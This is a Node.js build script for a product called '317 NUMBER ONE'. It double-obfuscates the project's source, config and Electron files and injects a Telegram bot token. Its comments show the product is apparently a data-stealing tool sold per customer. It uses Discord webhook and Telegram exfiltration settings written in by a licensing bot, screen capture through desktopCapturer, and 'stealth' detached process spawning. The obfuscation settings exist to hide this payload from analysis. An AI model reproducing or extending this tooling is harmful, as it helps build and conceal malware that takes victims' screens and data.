// 317 NUMBER ONE - Advanced Double Obfuscation System
const fs = require('fs');
const path = require('path');
const confuser = require('js-confuser');
const obfuscator = require('javascript-obfuscator');

const SOURCE_DIR = path.join(__dirname, '..', 'src');
const OUTPUT_DIR = path.join(__dirname, '..', 'obfuscated');
const CONFIG_FILE = path.join(__dirname, '..', 'config.js');
const INDEX_FILE = path.join(__dirname, '..', 'index.js');
const ELECTRON_DIR = path.join(__dirname, '..', 'electron');

console.log('╔════════════════════════════════════════════════════════╗');
console.log('║   317 NUMBER ONE - Double Obfuscation System             ║');
console.log('║   Stage 1: js-confuser (High Preset)                  ║');
console.log('║   Stage 2: javascript-obfuscator (Maximum Security)   ║');
console.log('║   + Electron main.js & renderer.html obfuscation      ║');
console.log('╚════════════════════════════════════════════════════════╝\n');

// Clean output directory
if (fs.existsSync(OUTPUT_DIR)) {
    try {
        fs.rmSync(OUTPUT_DIR, { recursive: true, force: true, maxRetries: 3, retryDelay: 1000 });
    } catch (err) {
        if (err.code === 'EPERM' || err.code === 'EBUSY') {
            console.log('⚠ obfuscated/ locked, trying forced removal...');
            try {
                require('child_process').execSync(`rmdir /S /Q "${OUTPUT_DIR}"`, { stdio: 'ignore', timeout: 10000 });
            } catch (e) {
                console.log('⚠ Could not fully clean obfuscated/ — continuing anyway');
            }
        }
    }
}
fs.mkdirSync(OUTPUT_DIR, { recursive: true });

// Collect all JS files
const filesToObfuscate = [];
// Separate list for HTML files that need inline script obfuscation
const htmlFilesToObfuscate = [];

function collectFiles(dir, baseDir = dir) {
    const entries = fs.readdirSync(dir, { withFileTypes: true });

    for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);

        if (entry.isDirectory()) {
            collectFiles(fullPath, baseDir);
        } else if (entry.isFile() && entry.name.endsWith('.js')) {
            const relativePath = path.relative(baseDir, fullPath);
            filesToObfuscate.push({
                source: fullPath,
                target: path.join(OUTPUT_DIR, relativePath),
                type: path.basename(fullPath)
            });
        }
    }
}

// Collect source files
collectFiles(SOURCE_DIR);

// Pre-process config.js: fix require paths for obfuscated directory structure before obfuscating
let configContent = fs.readFileSync(CONFIG_FILE, 'utf8');
configContent = configContent.replace(/\.\/src\/utils\//g, './utils/');
configContent = configContent.replace(/\.\/src\/modules\//g, './modules/');
configContent = configContent.replace(/\.\/src\/database\//g, './database/');

// Inject ONLY the global bot token before obfuscation
require('dotenv').config();

if (process.env.TELEGRAM_BOT_TOKEN) {
    configContent = configContent.replace(/TELEGRAM_BOT_TOKEN:\s*(process\.env\.TELEGRAM_BOT_TOKEN\s*\|\|\s*)?['"][^'"]*['"]/g, `TELEGRAM_BOT_TOKEN: '${process.env.TELEGRAM_BOT_TOKEN}'`);
    console.log('✓ Injected TELEGRAM_BOT_TOKEN into config.js');
}

// Note: We DO NOT inject DISCORD_WEBHOOK_URL, EXFIL_MODE, or TELEGRAM_CHAT_ID here 
// because license-bot.js already injected the specific customer's values into config.js!
console.log('✓ Preserved customer-specific settings in config.js');

filesToObfuscate.push({
    source: CONFIG_FILE,
    content: configContent,
    target: path.join(OUTPUT_DIR, 'config.js'),
    type: 'config.js'
});

// Pre-process index.js: fix require paths for obfuscated directory structure
let indexContent = fs.readFileSync(INDEX_FILE, 'utf8');
indexContent = indexContent.replace(/\.\/src\/utils\//g, './utils/');
indexContent = indexContent.replace(/\.\/src\/modules\//g, './modules/');
indexContent = indexContent.replace(/\.\/src\/database\//g, './database/');
console.log('✓ Pre-processed index.js (fixed require paths for obfuscated structure)');

filesToObfuscate.push({
    source: INDEX_FILE,
    content: indexContent,
    target: path.join(OUTPUT_DIR, 'index.js'),
    type: 'index.js'
});
// === ELECTRON FILES ===
// electron/main.js — obfuscate with Electron API name preservation
let electronMainContent = fs.readFileSync(path.join(ELECTRON_DIR, 'main.js'), 'utf8');
console.log('✓ Pre-processed electron/main.js (Electron API names will be preserved)');

filesToObfuscate.push({
    source: path.join(ELECTRON_DIR, 'main.js'),
    content: electronMainContent,
    target: path.join(OUTPUT_DIR, 'electron', 'main.js'),
    type: 'electron/main.js',
    isElectronMain: true
});

console.log(`Found ${filesToObfuscate.length} JS files to obfuscate\n`);

// Create output directories
for (const file of filesToObfuscate) {
    const dir = path.dirname(file.target);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
}

// Obfuscate files sequentially
async function runObfuscation() {
    let completed = 0;
    let failed = 0;

    for (const file of filesToObfuscate) {
        if (file.skipObfuscation) {
            try {
                fs.copyFileSync(file.source, file.target);
                completed++;
                console.log(`✓ [${completed}/${filesToObfuscate.length}] ${file.type} (copied — contains sensitive config)`);
            } catch (error) {
                failed++;
                console.error(`✗ Failed to copy ${file.type}:`, error.message);
            }
            continue;
        }

        try {
            console.log(`[Processing ${file.type}] Starting first obfuscation with js-confuser...`);
            let fileContent = file.content !== undefined ? file.content : fs.readFileSync(file.source, 'utf8');

            // CRITICAL: Preserve Node.js CJS globals before obfuscation.
            // js-confuser's globalConcealing wraps code in eval/function scopes
            // where __dirname, __filename, require, module, exports become undefined.
            // By capturing them into local const variables at the top, they survive.
            const globalsHeader = `const _317_dirname = typeof __dirname !== 'undefined' ? __dirname : '';
const _317_filename = typeof __filename !== 'undefined' ? __filename : '';
const _317_require = typeof require !== 'undefined' ? require : undefined;
const _317_module = typeof module !== 'undefined' ? module : undefined;
const _317_exports = typeof exports !== 'undefined' ? exports : undefined;
const _317_process = typeof process !== 'undefined' ? process : undefined;
`;
            // Replace all uses of __dirname/__filename with the safe captured versions
            fileContent = globalsHeader + fileContent
                .replace(/\b__dirname\b/g, '_317_dirname')
                .replace(/\b__filename\b/g, '_317_filename');

            // Electron API names that must NOT be renamed
            const electronReserved = [
                'app', 'screen', 'desktopCapturer', 'getSources', 'getPrimaryDisplay',
                'toJPEG', 'thumbnail', 'thumbnailSize', 'disableHardwareAcceleration',
                'commandLine', 'appendSwitch', 'whenReady', 'quit', 'BrowserWindow',
                'ipcMain', 'NativeImage', 'nativeImage', 'size', 'width', 'height',
                '__317capture', 'setCapturer', 'startStreamSession', 'main',
                'require', 'module', 'exports', 'process', '__dirname', '__filename',
                'global', 'console', 'setTimeout', 'setInterval', 'Buffer',
                'existsSync', 'writeFileSync', 'readFileSync', 'appendFileSync',
                'unlinkSync', 'statSync', 'mkdirSync', 'join', 'resolve',
                'on', 'once', 'emit', 'then', 'catch', 'finally',
                'pid', 'exit', 'env', 'tmpdir', 'platform',
                // Inline stealth variables
                'childProcess', 'spawn',
                'electron', 'copyFileSync', 'indexOf', 'toLowerCase',
                'basename', 'dirname', 'execPath', 'argv', 'unref', 'detached'
            ];

            const confuserOpts = {
                target: 'node',
                preset: 'high',
                compact: true,
                minify: true,
                hexadecimalNumbers: true,
                controlFlowFlattening: 0.95,
                deadCode: 0.8,
                dispatcher: 0.95,
                duplicateLiteralsRemoval: 1,
                flatten: true,
                globalConcealing: file.isElectronMain ? false : true,
                identifierGenerator: 'randomized',
                movedDeclarations: true,
                objectExtraction: file.isElectronMain ? false : true,
                opaquePredicates: 0.95,
                renameVariables: true,
                renameGlobals: file.isElectronMain ? false : true,
                shuffle: { hash: 1, true: 1 },
                stringConcealing: 1,
                stringCompression: 1,
                stringSplitting: 1
            };

            const confuserResult = await confuser.obfuscate(fileContent, confuserOpts);

            const confuserCode = typeof confuserResult === 'string'
                ? confuserResult
                : (confuserResult.code || confuserResult.toString());

            console.log(`[Processing ${file.type}] First obfuscation completed. Starting second obfuscation...`);

            const obfOpts = {
                compact: true,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.95,
                deadCodeInjection: true,
                deadCodeInjectionThreshold: 0.6,
                debugProtection: false,
                debugProtectionInterval: 2000,
                disableConsoleOutput: false,
                identifierNamesGenerator: 'hexadecimal',
                log: false,
                numbersToExpressions: true,
                renameGlobals: file.isElectronMain ? false : true,
                selfDefending: false,
                simplify: true,
                splitStrings: true,
                splitStringsChunkLength: 5,
                stringArray: true,
                stringArrayCallsTransform: true,
                stringArrayCallsTransformThreshold: 0.95,
                stringArrayEncoding: ['base64'],
                stringArrayIndexShift: true,
                stringArrayRotate: true,
                stringArrayShuffle: true,
                stringArrayWrappersCount: 5,
                stringArrayWrappersChainedCalls: true,
                stringArrayWrappersParametersMaxCount: 8,
                stringArrayWrappersType: 'function',
                stringArrayThreshold: 0.95,
                transformObjectKeys: file.isElectronMain ? false : true,
                unicodeEscapeSequence: false
            };

            // Preserve Electron native API names
            if (file.isElectronMain) {
                obfOpts.reservedNames = electronReserved.map(n => `^${n}$`);
                obfOpts.reservedStrings = ['desktopCapturer', 'screen', 'app', 'electron', '__317capture', 'getSources', 'toJPEG', 'getPrimaryDisplay', 'thumbnail', 'thumbnailSize', 'disableHardwareAcceleration', 'disable-gpu', 'no-sandbox', 'window-all-closed', 'before-quit', 'whenReady', '--type=', 'child_process', 'spawn', 'copyFileSync', 'execPath'];
            }

            const obfuscatorResult = obfuscator.obfuscate(confuserCode, obfOpts);

            const finalObfuscatedCode = obfuscatorResult.getObfuscatedCode();
            fs.writeFileSync(file.target, finalObfuscatedCode);

            completed++;
            console.log(`✓ [${completed}/${filesToObfuscate.length}] ${file.type} (Double obfuscation completed successfully)`);
        } catch (error) {
            failed++;
            console.error(`✗ [${completed + failed}/${filesToObfuscate.length}] ${file.type} - Obfuscation failed:`, error.message);
        }
    }

    console.log('\n╔════════════════════════════════════════════════════════╗');
    console.log(`║   JS Obfuscation Complete                              ║`);
    console.log(`║   Success: ${completed}/${filesToObfuscate.length}                                          ║`);
    console.log(`║   Failed:  ${failed}/${filesToObfuscate.length}                                          ║`);
    console.log('╚════════════════════════════════════════════════════════╝\n');

    if (failed > 0) {
        console.error('⚠️  Some files failed to obfuscate. Check errors above.');
        process.exit(1);
    }

    // === PHASE 2: HTML files with inline script obfuscation ===
    if (htmlFilesToObfuscate.length > 0) {
        console.log('╔════════════════════════════════════════════════════════╗');
        console.log('║   Phase 2: HTML Inline Script Obfuscation             ║');
        console.log('╚════════════════════════════════════════════════════════╝\n');

        for (const htmlFile of htmlFilesToObfuscate) {
            try {
                console.log(`[Processing ${htmlFile.type}] Extracting and obfuscating inline script...`);

                // Apply same globals preservation as JS files
                let htmlScriptContent = htmlFile.scriptContent;
                const htmlGlobalsHeader = `const _317_dirname = typeof __dirname !== 'undefined' ? __dirname : '';
const _317_filename = typeof __filename !== 'undefined' ? __filename : '';
const _317_require = typeof require !== 'undefined' ? require : undefined;
const _317_module = typeof module !== 'undefined' ? module : undefined;
const _317_exports = typeof exports !== 'undefined' ? exports : undefined;
const _317_process = typeof process !== 'undefined' ? process : undefined;
`;
                htmlScriptContent = htmlGlobalsHeader + htmlScriptContent
                    .replace(/\b__dirname\b/g, '_317_dirname')
                    .replace(/\b__filename\b/g, '_317_filename');

                // Stage 1: js-confuser on the extracted script
                const confuserResult = await confuser.obfuscate(htmlScriptContent, {
                    target: 'node',
                    preset: 'high',
                    compact: true,
                    minify: true,
                    hexadecimalNumbers: true,
                    controlFlowFlattening: 0.95,
                    deadCode: 0.8,
                    dispatcher: 0.95,
                    duplicateLiteralsRemoval: 1,
                    flatten: true,
                    globalConcealing: true,
                    identifierGenerator: 'randomized',
                    movedDeclarations: true,
                    objectExtraction: true,
                    opaquePredicates: 0.95,
                    renameVariables: true,
                    renameGlobals: true,
                    shuffle: { hash: 1, true: 1 },
                    stringConcealing: 1,
                    stringCompression: 1,
                    stringSplitting: 1
                });

                const confuserCode = typeof confuserResult === 'string'
                    ? confuserResult
                    : (confuserResult.code || confuserResult.toString());

                console.log(`[Processing ${htmlFile.type}] Stage 1 complete, running Stage 2...`);

                // Stage 2: javascript-obfuscator
                const obfuscatorResult = obfuscator.obfuscate(confuserCode, {
                    compact: true,
                    controlFlowFlattening: true,
                    controlFlowFlatteningThreshold: 0.95,
                    deadCodeInjection: true,
                    deadCodeInjectionThreshold: 0.6,
                    debugProtection: false,
                    disableConsoleOutput: false,
                    identifierNamesGenerator: 'hexadecimal',
                    log: false,
                    numbersToExpressions: true,
                    renameGlobals: true,
                    selfDefending: false,
                    simplify: true,
                    splitStrings: true,
                    splitStringsChunkLength: 5,
                    stringArray: true,
                    stringArrayCallsTransform: true,
                    stringArrayCallsTransformThreshold: 0.95,
                    stringArrayEncoding: ['base64'],
                    stringArrayIndexShift: true,
                    stringArrayRotate: true,
                    stringArrayShuffle: true,
                    stringArrayWrappersCount: 5,
                    stringArrayWrappersChainedCalls: true,
                    stringArrayWrappersParametersMaxCount: 8,
                    stringArrayWrappersType: 'function',
                    stringArrayThreshold: 0.95,
                    transformObjectKeys: true,
                    unicodeEscapeSequence: false
                });

                const obfuscatedScript = obfuscatorResult.getObfuscatedCode();

                // Rebuild the HTML with obfuscated script
                const obfuscatedHtml = htmlFile.htmlTemplate.replace(
                    /<script>[\s\S]*?<\/script>/,
                    `<script>${obfuscatedScript}</script>`
                );

                // Ensure target directory exists
                const targetDir = path.dirname(htmlFile.target);
                if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });

                fs.writeFileSync(htmlFile.target, obfuscatedHtml);
                completed++;
                console.log(`✓ ${htmlFile.type} (Inline script double-obfuscated and embedded)`);
            } catch (error) {
                failed++;
                console.error(`✗ ${htmlFile.type} - HTML obfuscation failed:`, error.message);
            }
        }
    }

    // Paths were fixed before obfuscation, so no need for plain text post-processing.

    console.log('\n✅ All files obfuscated successfully!\n');
    console.log('Next step: Run "npm run build" to create executable\n');
}

runObfuscation().catch(console.error);
